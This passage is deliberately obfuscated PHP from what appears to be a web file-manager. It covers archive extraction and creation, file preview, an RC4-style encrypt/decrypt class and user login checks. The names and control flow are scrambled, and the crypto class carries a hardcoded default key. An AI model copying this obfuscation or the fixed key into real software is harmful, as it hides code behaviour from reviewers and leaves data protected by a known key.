(!strstr(trim($E¬ŒÍÑª, $A„ÂàĞî•¸[8]), $A„ÂàĞî•¸[8])) { $b…ŠŸ‹™±Ñ = $b…ŠŸ‹™±Ñ . get_path_this($E¬ŒÍÑª) . $A„ÂàĞî•¸[8]; } } else { if ($AèŸ÷ğ Ğ¯ == $E‰„÷Ö÷è¡) { $AèŸ÷ğ Ğ¯ = $A„ÂàĞî•¸[33]; } } goto E©±öâ´¨; BºÙ¡²÷Ø: $dÙ»ã‚«ÁŒ = self::fileIndex($e—‘Ïì°¸ğ[$A„ÂàĞî•¸[1034]], $Có³Î¬Üé¡); $FíÊî­¸éë = str_replace(array($A„ÂàĞî•¸[1072], $A„ÂàĞî•¸[1896]), $A„ÂàĞî•¸[70], $dÙ»ã‚«ÁŒ[$A„ÂàĞî•¸[1894]]); $E‰„÷Ö÷è¡ = $FíÊî­¸éë; goto F½¦¾Öáõç; F½¦¾Öáõç: if ($GLOBALS[$A„ÂàĞî•¸[6]][$A„ÂàĞî•¸[1145]] != $A„ÂàĞî•¸[323]) { $E‰„÷Ö÷è¡ = unzip_pre_name($FíÊî­¸éë); } $AèŸ÷ğ Ğ¯ = get_path_father($FíÊî­¸éë); if ($AèŸ÷ğ Ğ¯ == $FíÊî­¸éë) { $AèŸ÷ğ Ğ¯ = $A„ÂàĞî•¸[33]; } goto BÏÈôƒğÌ; E©±öâ´¨: } goto fÄ±ìÇÁÅ; c¬À†”ÌÉß: $A„ÂàĞî•¸ =& $_SERVER[Äº¡•ô™Ÿ]; self::init(); $b–±ğ¾¨±É = !empty($GLOBALS[$A„ÂàĞî•¸[1049]]) ? $GLOBALS[$A„ÂàĞî•¸[1049]] : get_path_ext($fÙ¹Åƒó¶Û); goto D¥‡›ø’Ø; fÄ±ìÇÁÅ: if (self::checkIfType($b–±ğ¾¨±É, $A„ÂàĞî•¸[1876])) { if ($Có³Î¬Üé¡ != $A„ÂàĞî•¸[1031]) { $E‰„÷Ö÷è¡ = unzip_pre_name($E‰„÷Ö÷è¡); $AèŸ÷ğ Ğ¯ = unzip_pre_name($AèŸ÷ğ Ğ¯); $C½˜ˆ¯–ˆ¬ = PclTarExtractList($fÙ¹Åƒó¶Û, array($E‰„÷Ö÷è¡), $b…ŠŸ‹™±Ñ, $AèŸ÷ğ Ğ¯, $b–±ğ¾¨±É); } else { $C½˜ˆ¯–ˆ¬ = PclTarExtract($fÙ¹Åƒó¶Û, $b…ŠŸ‹™±Ñ, $A„ÂàĞî•¸[358], $b–±ğ¾¨±É); } return array($A„ÂàĞî•¸[1032] => $C½˜ˆ¯–ˆ¬, $A„ÂàĞî•¸[1034] => PclErrorString(!0)); } else { if (self::checkIfType($b–±ğ¾¨±É, $A„ÂàĞî•¸[1045])) { return kodRarArchive::extract($fÙ¹Åƒó¶Û, $b…ŠŸ‹™±Ñ, $b–±ğ¾¨±É, $FíÊî­¸éë); } else { if (kodZipArchive::support($A„ÂàĞî•¸[1898])) { return kodZipArchive::extract($fÙ¹Åƒó¶Û, $b…ŠŸ‹™±Ñ, $FíÊî­¸éë); } else { $aª‘÷‚–Êá = new PclZip($fÙ¹Åƒó¶Û); if ($Có³Î¬Üé¡ != $A„ÂàĞî•¸[1031]) { $C½˜ˆ¯–ˆ¬ = $aª‘÷‚–Êá->extract(PCLZIP_OPT_PATH, $b…ŠŸ‹™±Ñ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $A„ÂàĞî•¸[1899], PCLZIP_OPT_BY_NAME, $dÙ»ã‚«ÁŒ[$A„ÂàĞî•¸[1894]], PCLZIP_OPT_REMOVE_PATH, $AèŸ÷ğ Ğ¯, PCLZIP_OPT_REPLACE_NEWER); } else { $C½˜ˆ¯–ˆ¬ = $aª‘÷‚–Êá->extract(PCLZIP_OPT_PATH, $b…ŠŸ‹™±Ñ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $A„ÂàĞî•¸[1899], PCLZIP_OPT_REPLACE_NEWER); } return array($A„ÂàĞî•¸[1032] => $C½˜ˆ¯–ˆ¬, $A„ÂàĞî•¸[1034] => $aª‘÷‚–Êá->errorName(!0)); } } } return array($A„ÂàĞî•¸[1032] => !1, $A„ÂàĞî•¸[1034] => $A„ÂàĞî•¸[1900]); goto A¡ªƒá¶Ş¦; A¡ªƒá¶Ş¦: } static function fileIndex($AòõèÆÛ‰, $fÛãß°í, $Bñ¹šŞÙ = false) { goto eŸ¥Š±¤®ì; BâÈÅŞ´ó: $EÍÈà¿‰¹Ó = $AĞ×»È¤ë; if ($Bñ¹šŞÙ) { $EÍÈà¿‰¹Ó = $AĞ×»È¤ë[$Bñ¹šŞÙ]; if ($AĞ×»È¤ë[$dĞ¨³ô†ìÃ[76]]) { $EÍÈà¿‰¹Ó = rtrim($EÍÈà¿‰¹Ó, $dĞ¨³ô†ìÃ[8]) . $dĞ¨³ô†ìÃ[8]; } } return $EÍÈà¿‰¹Ó; goto bô‘¢­½–; C¥ÄŒ®Å‚: $cãòñÕíªà = count($AòõèÆÛ‰); for ($cŒ›‡İ°É = 0; $cŒ›‡İ°É < $cãòñÕíªà; $cŒ›‡İ°É++) { if ($fÛãß°í == $AòõèÆÛ‰[$cŒ›‡İ°É][$dĞ¨³ô†ìÃ[1036]]) { $AĞ×»È¤ë = $AòõèÆÛ‰[$cŒ›‡İ°É]; break; } } if (!$AĞ×»È¤ë) { show_tips($dĞ¨³ô†ìÃ[1901]); } goto BâÈÅŞ´ó; eŸ¥Š±¤®ì: $dĞ¨³ô†ìÃ =& $_SERVER[Äº¡•ô™Ÿ]; self::init(); if (!is_array($AòõèÆÛ‰)) { return !1; } goto C¥ÄŒ®Å‚; bô‘¢­½–: } static function extractZipFile($c»‡œ™Â—, $D™ÅĞÁ‡‚, $fªòºç”‚ = false) { goto C„ÆÊ¡ÚÇ; C„ÆÊ¡ÚÇ: $b·ƒÊªˆø =& $_SERVER[Äº¡•ô™Ÿ]; self::init(); $cÌ‰Ø‹–Ş = TEMP_FILES . hash_path($c»‡œ™Â—) . $b·ƒÊªˆø[8]; goto CÂòİ¢†äç; FøŒÊŒÎÂ‹: if (!file_exists($dÌĞ¶È»á)) { return !1; } @rename($dÌĞ¶È»á, $B„¹í©ÚÅŸ); return $B„¹í©ÚÅŸ; goto dèİ¹Õ¿¼; Bô¯àÃí¾: if (file_exists($B„¹í©ÚÅŸ)) { return $B„¹í©ÚÅŸ; } $Bíò–×ÓÌ÷ = new PclZip($c»‡œ™Â—); $dÌĞ¶È»á = unzip_filter_ext($cÌ‰Ø‹–Ş . get_path_this($D™ÅĞÁ‡‚)); goto BÊŒ©ñ ê±; CÂòİ¢†äç: mk_dir($cÌ‰Ø‹–Ş); $B„¹í©ÚÅŸ = $cÌ‰Ø‹–Ş . md5($c»‡œ™Â— . $D™ÅĞÁ‡‚); if ($fªòºç”‚) { $B„¹í©ÚÅŸ = $cÌ‰Ø‹–Ş . $fªòºç”‚; } goto Bô¯àÃí¾; BÊŒ©ñ ê±: $dÂÌ£ò¼ƒÛ = get_path_father($D™ÅĞÁ‡‚); if ($dÂÌ£ò¼ƒÛ == $D™ÅĞÁ‡‚) { $dÂÌ£ò¼ƒÛ = $b·ƒÊªˆø[33]; } $EÄ†˜òğó§ = $Bíò–×ÓÌ÷->extract(PCLZIP_OPT_PATH, $cÌ‰Ø‹–Ş, PCLZIP_CB_PRE_FILE_NAME, $b·ƒÊªˆø[1899], PCLZIP_OPT_REMOVE_PATH, $dÂÌ£ò¼ƒÛ, PCLZIP_OPT_BY_NAME, $D™ÅĞÁ‡‚); goto FøŒÊŒÎÂ‹; dèİ¹Õ¿¼: } static function filePreview($E”®‹™¥×ñ, $eø÷°ğœ¹œ, $EÆÅ¶˜Ûƒ = false, $cÖ«²‡Ä¥ = false) { goto eÜÌ“©Öé·; dçö˜ÆË„À: if (!$e‚ê»Ï‘Ì˜[$Dò—×ãºƒè[1032]]) { show_json($e‚ê»Ï‘Ì˜[$Dò—×ãºƒè[1034]], !1); } if (!file_exists($cà­ºïğ½³)) { show_json($Dò—×ãºƒè[1903], !1); } @rename($cà­ºïğ½³, $f„Ë¶©ßÒ); goto cæ‘•Ù”¡Ï; eÜÌ“©Öé·: $Dò—×ãºƒè =& $_SERVER[Äº¡•ô™Ÿ]; self::init(); $báİ³ÅË‚î = TEMP_FILES . hash_path($E”®‹™¥×ñ) . $Dò—×ãºƒè[8]; goto Fß˜ö® Æ–; Fß˜ö® Æ–: mk_dir($báİ³ÅË‚î); $f„Ë¶©ßÒ = $báİ³ÅË‚î . md5($E”®‹™¥×ñ . $eø÷°ğœ¹œ . $cÖ«²‡Ä¥); $EîÙë„ëä» = $Dò—×ãºƒè[33]; goto c‚ÁøÃë˜÷; cæ‘•Ù”¡Ï: if (!file_exists($f„Ë¶©ßÒ)) { del_dir($báİ³ÅË‚î); show_json($Dò—×ãºƒè[1904]); } IO::fileOut($f„Ë¶©ßÒ, $EÆÅ¶˜Ûƒ, $båçµˆí¦); goto AÏ°“Ó´ˆ; c‚ÁøÃë˜÷: $e‚ê»Ï‘Ì˜ = self::extract($E”®‹™¥×ñ, $báİ³ÅË‚î, $eø÷°ğœ¹œ, $EîÙë„ëä»); if (is_array($EîÙë„ëä»)) { show_json($Dò—×ãºƒè[1902], !1); } if (file_exists($f„Ë¶©ßÒ)) { IO::fileOut($f„Ë¶©ßÒ, $EÆÅ¶˜Ûƒ, get_path_this($EîÙë„ëä»)); return; } goto bÑÏ§Û¾Á¡; bÑÏ§Û¾Á¡: $EîÙë„ëä» = unzip_pre_name($EîÙë„ëä»); $båçµˆí¦ = get_path_this($EîÙë„ëä»); $cà­ºïğ½³ = unzip_filter_ext($báİ³ÅË‚î . $båçµˆí¦); goto dçö˜ÆË„À; AÏ°“Ó´ˆ: } static function create($cÙƒÚîÑå§, $b¹¯—¿òÑÉ) { $bøÏÈ…Ô‡Å =& $_SERVER[Äº¡•ô™Ÿ]; self::init(); $E¥âÙ§©¼ = get_path_ext($cÙƒÚîÑå§); $Eİ’É·µ³Â = !1; if (self::checkIfType($E¥âÙ§©¼, $bøÏÈ…Ô‡Å[298])) { if (kodZipArchive::support($bøÏÈ…Ô‡Å[1010])) { return kodZipArchive::create($cÙƒÚîÑå§, $b¹¯—¿òÑÉ); } $D®ÓƒİÄ‘¾ = new PclZip($cÙƒÚîÑå§); foreach ($b¹¯—¿òÑÉ as $eóÅÃˆ‹ˆâ => $AµÏÂÑÎòË) { $AµÏÂÑÎòË = str_replace($bøÏÈ…Ô‡Å[463], $bøÏÈ…Ô‡Å[8], $AµÏÂÑÎòË); $fõäŒ®Š®Ù = Kodio::clear(get_path_father($AµÏÂÑÎòË)); if ($eóÅÃˆ‹ˆâ == 0) { $Eİ’É·µ³Â = $D®ÓƒİÄ‘¾->create($AµÏÂÑÎòË, PCLZIP_OPT_REMOVE_PATH, $fõäŒ®Š®Ù, PCLZIP_CB_PRE_FILE_NAME, $bøÏÈ…Ô‡Å[1905]); continue; } $Eİ’É·µ³Â = $D®ÓƒİÄ‘¾->add($AµÏÂÑÎòË, PCLZIP_OPT_REMOVE_PATH, $fõäŒ®Š®Ù, PCLZIP_CB_PRE_FILE_NAME, $bøÏÈ…Ô‡Å[1905]); } } else { if (self::checkIfType($E¥âÙ§©¼, $bøÏÈ…Ô‡Å[1876])) { foreach ($b¹¯—¿òÑÉ as $eóÅÃˆ‹ˆâ => $AµÏÂÑÎòË) { $AµÏÂÑÎòË = str_replace($bøÏÈ…Ô‡Å[463], $bøÏÈ…Ô‡Å[8], $AµÏÂÑÎòË); $fõäŒ®Š®Ù = Kodio::clear(get_path_father($AµÏÂÑÎòË)); if ($eóÅÃˆ‹ˆâ == 0) { $Eİ’É·µ³Â = PclTarCreate($cÙƒÚîÑå§, array($AµÏÂÑÎòË), $E¥âÙ§©¼, null, $fõäŒ®Š®Ù); continue; } $Eİ’É·µ³Â = PclTarAddList($cÙƒÚîÑå§, array($AµÏÂÑÎòË), $bøÏÈ…Ô‡Å[33], $fõäŒ®Š®Ù, $E¥âÙ§©¼); } } } return $Eİ’É·µ³Â; } } class Mcrypt { public static $defaultKey = "\141\x21\164\141\x6b\101\x3a\144\x6c\155\143\x6c\x64\x45\x76\x2c\x65"; public static function encode($aÑˆ‹ˆœğ‘, $B ¾¦¬Æè = '', $eîâŸ„Äô‚ = 0, $AÎàÚÅå‚§ = '') { goto FÍéùÕ¡á; FÍéùÕ¡á: $eçóñ«ƒÍ =& $_SERVER[Äº¡•ô™Ÿ]; $BŞ„­ƒ‹Ÿ = 4; $B ¾¦¬Æè = md5($B ¾¦¬Æè ? $B ¾¦¬Æè : self::$defaultKey); goto C·é¬ñ”Š±; CŠ±÷Ö¥•: $dÏàÚğ‰Å = substr($AÎàÚÅå‚§, -$BŞ„­ƒ‹Ÿ); $Aœƒ÷†äò¬ = $DÈÅ›ÕÅÜ˜ . md5($DÈÅ›ÕÅÜ˜ . $dÏàÚğ‰Å); $f²‚âÛÒëƒ = strlen($Aœƒ÷†äò¬); goto D±«±Şƒ¥; C·é¬ñ”Š±: $DÈÅ›ÕÅÜ˜ = md5(substr($B ¾¦¬Æè, 0, 16)); $cÎô£ªÉß· = md5(substr($B ¾¦¬Æè, 16, 16)); $AÎàÚÅå‚§ = $AÎàÚÅå‚§ ? $AÎàÚÅå‚§ : md5(microtime()); goto CŠ±÷Ö¥•; eê“±ºŒ: $F‚Üšà¬å‚ = $eçóñ«ƒÍ[33]; for ($cà¾¥‘ğÑÔ = $fßÙù¹¨Ú¹ = $B°•ì™Ü¶ó = 0; $B°•ì™Ü¶ó < $Cª¢‚Ë§ĞÍ; $B°•ì™Ü¶ó++) { $cà¾¥‘ğÑÔ = ($cà¾¥‘ğÑÔ + 1) % 256; $fßÙù¹¨Ú¹ = ($fßÙù¹¨Ú¹ + $D¦‹òÅ¡Î±[$cà¾¥‘ğÑÔ]) % 256; $CÇã˜‹·‰ß = $D¦‹òÅ¡Î±[$cà¾¥‘ğÑÔ]; $D¦‹òÅ¡Î±[$cà¾¥‘ğÑÔ] = $D¦‹òÅ¡Î±[$fßÙù¹¨Ú¹]; $D¦‹òÅ¡Î±[$fßÙù¹¨Ú¹] = $CÇã˜‹·‰ß; $F‚Üšà¬å‚ .= chr(ord($aÑˆ‹ˆœğ‘[$B°•ì™Ü¶ó]) ^ $D¦‹òÅ¡Î±[($D¦‹òÅ¡Î±[$cà¾¥‘ğÑÔ] + $D¦‹òÅ¡Î±[$fßÙù¹¨Ú¹]) % 256]); } $F‚Üšà¬å‚ = $dÏàÚğ‰Å . str_replace($eçóñ«ƒÍ[909], $eçóñ«ƒÍ[33], base64_encode($F‚Üšà¬å‚)); goto D‹¾·Ş®¯Í; f´ÄŞ×°À“: for ($B°•ì™Ü¶ó = 0; $B°•ì™Ü¶ó <= 255; $B°•ì™Ü¶ó++) { $aÈÙ‹ÕÒ“õ[$B°•ì™Ü¶ó] = ord($Aœƒ÷†äò¬[$B°•ì™Ü¶ó % $f²‚âÛÒëƒ]); } $D¦‹òÅ¡Î± = range(0, 255); for ($fßÙù¹¨Ú¹ = $B°•ì™Ü¶ó = 0; $B°•ì™Ü¶ó < 256; $B°•ì™Ü¶ó++) { $fßÙù¹¨Ú¹ = ($fßÙù¹¨Ú¹ + $D¦‹òÅ¡Î±[$B°•ì™Ü¶ó] + $aÈÙ‹ÕÒ“õ[$B°•ì™Ü¶ó]) % 256; $CÇã˜‹·‰ß = $D¦‹òÅ¡Î±[$B°•ì™Ü¶ó]; $D¦‹òÅ¡Î±[$B°•ì™Ü¶ó] = $D¦‹òÅ¡Î±[$fßÙù¹¨Ú¹]; $D¦‹òÅ¡Î±[$fßÙù¹¨Ú¹] = $CÇã˜‹·‰ß; } goto eê“±ºŒ; D±«±Şƒ¥: $aÑˆ‹ˆœğ‘ = sprintf($eçóñ«ƒÍ[1906], $eîâŸ„Äô‚ ? $eîâŸ„Äô‚ + time() : 0) . substr(md5($aÑˆ‹ˆœğ‘ . $cÎô£ªÉß·), 0, 16) . $aÑˆ‹ˆœğ‘; $Cª¢‚Ë§ĞÍ = strlen($aÑˆ‹ˆœğ‘); $aÈÙ‹ÕÒ“õ = array(); goto f´ÄŞ×°À“; D‹¾·Ş®¯Í: $F‚Üšà¬å‚ = str_replace(array($eçóñ«ƒÍ[281], $eçóñ«ƒÍ[8], $eçóñ«ƒÍ[909]), array($eçóñ«ƒÍ[408], $eçóñ«ƒÍ[70], $eçóñ«ƒÍ[93]), $F‚Üšà¬å‚); return $F‚Üšà¬å‚; goto bÄ§Ã ¥Õ; bÄ§Ã ¥Õ: } public static function decode($c„«“†Ä±‰, $a «ÁË¾ = '') { goto BòªÖ÷ÍÏ; BòªÖ÷ÍÏ: $DíóÄìàà  =& $_SERVER[Äº¡•ô™Ÿ]; $c„«“†Ä±‰ = str_replace(array($DíóÄìàà [408], $DíóÄìàà [70], $DíóÄìàà [93]), array($DíóÄìàà [281], $DíóÄìàà [8], $DíóÄìàà [909]), $c„«“†Ä±‰); $eÄâÛ ¨÷ = 4; goto EßùÎ‹ò; fÄ‹°—™ò: $fñ¯õ‰ÈÀµ = substr($c„«“†Ä±‰, 0, $eÄâÛ ¨÷); $E‘ƒî“àë = $B¬ìÎïÁ¥ . md5($B¬ìÎïÁ¥ . $fñ¯õ‰ÈÀµ); $FÓ‰İÖ‰À = strlen($E‘ƒî“àë); goto aÉßó…ß•; Eã‹ñ³ƒä‘: if (($D‰„Äê ‹ == 0 || $D‰„Äê ‹ - time() > 0) && substr($B„Â¿›ÈßË, 10, 16) == substr(md5(substr($B„Â¿›ÈßË, 26) . $C¨‘¬İÍôÃ), 0, 16)) { return substr($B„Â¿›ÈßË, 26); } else { return $DíóÄìàà [33]; } goto F×î ³¯°å; EßùÎ‹ò: $a «ÁË¾ = md5($a «ÁË¾ ? $a «ÁË¾ : self::$defaultKey); $B¬ìÎïÁ¥ = md5(substr($a «ÁË¾, 0, 16)); $C¨‘¬İÍôÃ = md5(substr($a «ÁË¾, 16, 16)); goto fÄ‹°—™ò; aÇÚ÷‡ª¸³: for ($A›äÑà¦Ñ = 0; $A›äÑà¦Ñ <= 255; $A›äÑà¦Ñ++) { $AÃ×òˆèäÖ[$A›äÑà¦Ñ] = ord($E‘ƒî“àë[$A›äÑà¦Ñ % $FÓ‰İÖ‰À]); } $dÍÛäÍçÌ­ = range(0, 255); for ($FÓß¯Ê’Éä = $A›äÑà¦Ñ = 0; $A›äÑà¦Ñ < 256; $A›äÑà¦Ñ++) { $FÓß¯Ê’Éä = ($FÓß¯Ê’Éä + $dÍÛäÍçÌ­[$A›äÑà¦Ñ] + $AÃ×òˆèäÖ[$A›äÑà¦Ñ]) % 256; $bª´¶˜¼Š = $dÍÛäÍçÌ­[$A›äÑà¦Ñ]; $dÍÛäÍçÌ­[$A›äÑà¦Ñ] = $dÍÛäÍçÌ­[$FÓß¯Ê’Éä]; $dÍÛäÍçÌ­[$FÓß¯Ê’Éä] = $bª´¶˜¼Š; } goto Cô«»¦·; Cô«»¦·: $B„Â¿›ÈßË = $DíóÄìàà [33]; for ($A’„Ì¥”¾ß = $FÓß¯Ê’Éä = $A›äÑà¦Ñ = 0; $A›äÑà¦Ñ < $EÒ¹Şãç•¹; $A›äÑà¦Ñ++) { $A’„Ì¥”¾ß = ($A’„Ì¥”¾ß + 1) % 256; $FÓß¯Ê’Éä = ($FÓß¯Ê’Éä + $dÍÛäÍçÌ­[$A’„Ì¥”¾ß]) % 256; $bª´¶˜¼Š = $dÍÛäÍçÌ­[$A’„Ì¥”¾ß]; $dÍÛäÍçÌ­[$A’„Ì¥”¾ß] = $dÍÛäÍçÌ­[$FÓß¯Ê’Éä]; $dÍÛäÍçÌ­[$FÓß¯Ê’Éä] = $bª´¶˜¼Š; $B„Â¿›ÈßË .= chr(ord($c„«“†Ä±‰[$A›äÑà¦Ñ]) ^ $dÍÛäÍçÌ­[($dÍÛäÍçÌ­[$A’„Ì¥”¾ß] + $dÍÛäÍçÌ­[$FÓß¯Ê’Éä]) % 256]); } $D‰„Äê ‹ = intval(substr($B„Â¿›ÈßË, 0, 10)); goto Eã‹ñ³ƒä‘; aÉßó…ß•: $c„«“†Ä±‰ = base64_decode(substr($c„«“†Ä±‰, $eÄâÛ ¨÷)); $EÒ¹Şãç•¹ = strlen($c„«“†Ä±‰); $AÃ×òˆèäÖ = array(); goto aÇÚ÷‡ª¸³; F×î ³¯°å: } } goto B¨ğ§‚êåç; F™ºØÒ¯’‚: class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\x72"; protected $tableMeta = array("\164\141\x62\154\145\116\x61\155\x65" => "\x75\163\145\162\x5f\155\x65\x74\141", "\x6d\x65\x74\141\x46\151\145\x6c\144" => "\165\x73\145\162\111\x44"); protected $simpleField = "\x75\x73\145\x72\111\x44\54\156\151\x63\x6b\x4e\141\x6d\x65\x2c\x6e\141\x6d\x65\54\x61\x76\x61\x74\x61\x72\54\163\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($cÊÍ–»²²©) { $B£ÙãöÑ…À =& $_SERVER[Äº¡•ô™Ÿ]; $DôÛËĞ¦ = $B£ÙãöÑ…À[2455]; return array($B£ÙãöÑ…À[2145] => array($cÊÍ–»²²©[0], $DôÛËĞ¦), $B£ÙãöÑ…À[2147] => array($cÊÍ–»²²©[0], $DôÛËĞ¦), $B£ÙãöÑ…À[2456] => array($cÊÍ–»²²©[0], $DôÛËĞ¦)); } protected function getInfo($BŞËšèö÷Ã, $E…ä¥¿Òè¬ = false) { $CÉ‡œÖ¤¿Œ = $this->getInfoSimple($BŞËšèö÷Ã); if (!is_array($CÉ‡œÖ¤¿Œ)) { return array(); } if ($E…ä¥¿Òè¬) { return $this->_getInfoApply($CÉ‡œÖ¤¿Œ); } return $this->cacheFunctionGet($_SERVER[Äº¡•ô™Ÿ][2187], $BŞËšèö÷Ã); } protected function getInfoFull($dˆ’ÖØ±ÃÒ, $AøÏí¢‘Ğè = false) { $eÕà†°“º£ = $this->getInfoSimple($dˆ’ÖØ±ÃÒ); if (!is_array($eÕà†°“º£)) { return array(); } if ($AøÏí¢‘Ğè) { return $this->_getInfoApply($eÕà†°“º£, !0); return $this->_getInfoApply($eÕà†°“º£, !0); } return $this->cacheFunctionGet($_SERVER[Äº¡•ô™Ÿ][2457], $dˆ’ÖØ±ÃÒ); } private function _getInfoApply($bÅÍ¿Ä§Ó, $b·¤àÁÅ± = false) { goto dÆĞÌÆéá; d¯æŞ—åä: $bÅÍ¿Ä§Ó = $this->_listDataApplyItem($bÅÍ¿Ä§Ó); $BˆØ‘Î‹åä = Model($aİ£ÒÚè„†[1110])->metaGet($bÅÍ¿Ä§Ó[$aİ£ÒÚè„†[388]][$aİ£ÒÚè„†[366]]); $bÅÍ¿Ä§Ó[$aİ£ÒÚè„†[2460]] = $bÏòçÇïÜ; goto Cœˆ‰¯¾†Å; Cœˆ‰¯¾†Å: $bÅÍ¿Ä§Ó[$aİ£ÒÚè„†[388]][$aİ£ÒÚè„†[2295]] = isset($BˆØ‘Î‹åä[$aİ£ÒÚè„†[2296]]) ? $BˆØ‘Î‹åä[$aİ£ÒÚè„†[2296]] : null; if ($b·¤àÁÅ±) { $bÅÍ¿Ä§Ó[$aİ£ÒÚè„†[413]] = $this->metaGet($bÅÍ¿Ä§Ó[$aİ£ÒÚè„†[1416]]); } return $bÅÍ¿Ä§Ó; goto fÒ›¼¦áãœ; dÆĞÌÆéá: $aİ£ÒÚè„† =& $_SERVER[Äº¡•ô™Ÿ]; if (!$bÅÍ¿Ä§Ó) { return $bÅÍ¿Ä§Ó; } $bÏòçÇïÜ = md5($aİ£ÒÚè„†[2458] . $bÅÍ¿Ä§Ó[$aİ£ÒÚè„†[804]] . $aİ£ÒÚè„†[2459] . $bÅÍ¿Ä§Ó[$aİ£ÒÚè„†[28]]); goto d¯æŞ—åä; fÒ›¼¦áãœ: } protected function getInfoSimple($bé¶°¥ñ», $dª„Ø†¢Î = false) { $F¬ìîïâ£‹ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$bé¶°¥ñ») { return array(); } if ($dª„Ø†¢Î) { $C¤õóÒÇå³ = $this->where(array($F¬ìîïâ£‹[1416] => intval($bé¶°¥ñ»)))->find(); if (!is_array($C¤õóÒÇå³)) { return array(); } $C¤õóÒÇå³[$F¬ìîïâ£‹[2461]] = Action($F¬ìîïâ£‹[2462])->parseUrl($C¤õóÒÇå³[$F¬ìîïâ£‹[2461]]); return $C¤õóÒÇå³; } return $this->cacheFunctionGet($F¬ìîïâ£‹[2148], $bé¶°¥ñ»); } protected function getInfoSimpleOuter($cÁò¬öõË•) { goto cŸ—Ğñù; cŸ—Ğñù: $DÍ‚í’¤ä¢ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$cÁò¬öõË• || $cÁò¬öõË• == 0) { return array($DÍ‚í’¤ä¢[1416] => $DÍ‚í’¤ä¢[464], $DÍ‚í’¤ä¢[28] => $DÍ‚í’¤ä¢[154] . LNG($DÍ‚í’¤ä¢[2463]) . $DÍ‚í’¤ä¢[472], $DÍ‚í’¤ä¢[2461] => STATIC_PATH . $DÍ‚í’¤ä¢[2464]); } $F”Ì¨ç‡×À = $this->cacheFunctionGet($DÍ‚í’¤ä¢[2148], $cÁò¬öõË•); goto D«î¦„ÍÍ; D«î¦„ÍÍ: $d¬µºí‡İß = array_field_key($F”Ì¨ç‡×À, explode($DÍ‚í’¤ä¢[47], $this->simpleField)); if (!$d¬µºí‡İß) { return array($DÍ‚í’¤ä¢[1416] => $DÍ‚í’¤ä¢[1031], $DÍ‚í’¤ä¢[28] => $DÍ‚í’¤ä¢[154] . LNG($DÍ‚í’¤ä¢[2465]) . $DÍ‚í’¤ä¢[472], $DÍ‚í’¤ä¢[2461] => STATIC_PATH . $DÍ‚í’¤ä¢[2466]); } $d¬µºí‡İß[$DÍ‚í’¤ä¢[2461]] = Action($DÍ‚í’¤ä¢[2462])->parseUrl($d¬µºí‡İß[$DÍ‚í’¤ä¢[2461]]); goto e Òõ¥è; e Òõ¥è: return $d¬µºí‡İß; goto dù ŠÅÔ„; dù ŠÅÔ„: } protected function groupUser($Dîò ²­¶î) { } public static function errorLang($CÑ‹‚ªÃ‚) { $E…¥íË¥ĞÃ =& $_SERVER[Äº¡•ô™Ÿ]; $C†ŞÍ§Âƒ = array(self::ERROR_USER_NOT_EXISTS => $E…¥íË¥ĞÃ[2467], self::ERROR_USER_PASSWORD_ERROR => $E…¥íË¥ĞÃ[2468], self::ERROR_USER_EXIST_NAME => $E…¥íË¥ĞÃ[2469], self::ERROR_USER_EXIST_PHONE => $E…¥íË¥ĞÃ[2470], self::ERROR_USER_EXIST_EMAIL => $E…¥íË¥ĞÃ[2471], self::ERROR_USER_LOGIN_LOCK => $E…¥íË¥ĞÃ[2472], self::ERROR_IP_NOT_ALLOW => $E…¥íË¥ĞÃ[2473], self::ERROR_USER_EXIST_NICKNAME => $E…¥íË¥ĞÃ[2474]); return LNG($C†ŞÍ§Âƒ[$CÑ‹‚ªÃ‚]); } public function getInfoByMeta($c°ƒ„Êö¬÷, $aêÁèàÎ¹) { $e¤ùêğíÙö =& $_SERVER[Äº¡•ô™Ÿ]; $eèØ‚„‹“¦ = Model($e¤ùêğíÙö[2475])->where(array($e¤ùêğíÙö[89] => $c°ƒ„Êö¬÷, $e¤ùêğíÙö[356] => $aêÁèàÎ¹))->find(); if ($eèØ‚„‹“¦) { return $this->getInfo($eèØ‚„‹“¦[$e¤ùêğíÙö[1416]]); } return !1; } public function userLoginCheck($C„ßÒäÊÆô, $FƒÍ¡Ë÷¶) { goto EŸÁ®šÄ¾; EäÑ‹™¥Îò: $this->userEdit($fî ƒÃâ§Ø[$cÂËïì”›Ò[1416]], array($cÂËïì”›Ò[2477] => time())); $this->clearCache($fî ƒÃâ§Ø[$cÂËïì”›Ò[1416]]); return $this->getInfo($fî ƒÃâ§Ø[$cÂËïì”›Ò[1416]]); goto Fï¸¢èî¢’; EŸÁ®šÄ¾: $cÂËïì”›Ò =& $_SERVER[Äº¡•ô™Ÿ]; $cî„Â½óÜĞ = array($cÂËïì”›Ò[28] => $C„ßÒäÊÆô, $cÂËïì”›Ò[2299] => $C„ßÒäÊÆô, $cÂËïì”›Ò[290] => $C„ßÒäÊÆô, $cÂËïì”›Ò[2476] => $C„ßÒäÊÆô, $cÂËïì”›Ò[916] => $cÂËïì”›Ò[918]); if ($this->nickNameRpt()) { unset($cî„Â½óÜĞ[$cÂËïì”›Ò[2299]]); } goto EµÁÌèçœ¿; EµÁÌèçœ¿: $fî ƒÃâ§Ø = $this->where($cî„Â½óÜĞ)->find(); if (!$fî ƒÃâ§Ø) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($fî ƒÃâ§Ø[$cÂËïì”›Ò[1416]], $FƒÍ¡Ë÷¶)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto EäÑ‹™¥Îò; Fï¸¢èî¢’: } public function clearCache($b–·¡“Åš›) { $AÄ÷¦Œé­Š =& $_SERVER[Äº¡•ô™Ÿ]; $this->cacheFunctionClear($AÄ÷¦Œé­Š[2187], $b–·¡“Åš›); $this->cacheFunctionClear($AÄ÷¦Œé­Š[2148], $b–·¡“Åš›); } public function 